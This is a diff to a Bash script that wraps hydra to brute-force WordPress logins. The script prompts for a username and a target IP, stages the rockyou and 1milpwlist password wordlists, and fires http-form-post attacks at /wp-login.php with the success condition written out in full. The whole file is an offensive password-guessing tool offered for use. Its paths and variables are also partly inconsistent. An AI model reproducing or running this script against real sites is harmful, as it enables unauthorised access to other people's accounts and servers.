@@ -12,16 +12,20 @@ NC='\033[0m' # No Color
 echo -e "downloading reqired packages..."
 sudo apt install hydra
 
+# download and unpack wordlists
+echo -e "$GREEN""moving wordlists""$NC"
+cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/rockyou.txt.gz ~
+cp -n /mnt/c/Users/Sephley/Documents/GitHub/Hydra/Hydra/wordlists/1milpwlist.txt ~
+
 # create directories
 mkdir ~/pwbruteforcer
 mkdir ~/pwbruteforcer/wordlists
+mv ~/rockyou.txt.gz ~/pwbruteforcer/wordlists
+mv ~/1milpwlist.txt ~/pwbruteforcer/wordlists
 
-# download and unpack wordlists
-echo -e "$GREEN""downloading wordlists""$NC"
-wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/rockyou.txt.gz -o ~/pwbruteforcer/wordlists
-wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/1milpwlist.txt -o ~/pwbruteforcer/wordlists
+# de-compress rockyou.txt
 echo -e "$GREEN""de-compressing wordlists""$NC"
-gzip -dc wordlists/rockyou.txt.gz > ~/pwbruteforcer/wordlists/rockyou.txt
+gzip -d ~/pwbruteforcer/wordlists/rockyou.txt.gz
 
 echo -e "$GREEN""enter username: ""$NC"
 read -r USERNAME
@@ -40,9 +44,9 @@ echo -e "$RED>>> Invalid Selection""$NC"; done
 
 if [ "$REPLY" == 1 ] ;
 then echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ROCKYOU "$IPADDRESS" -V http-form-post
+hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
-hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ONEMILPWLIST "$IPADDRESS" -V http-form-post
+hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 fi
 
 # use pw-inspector to filter?
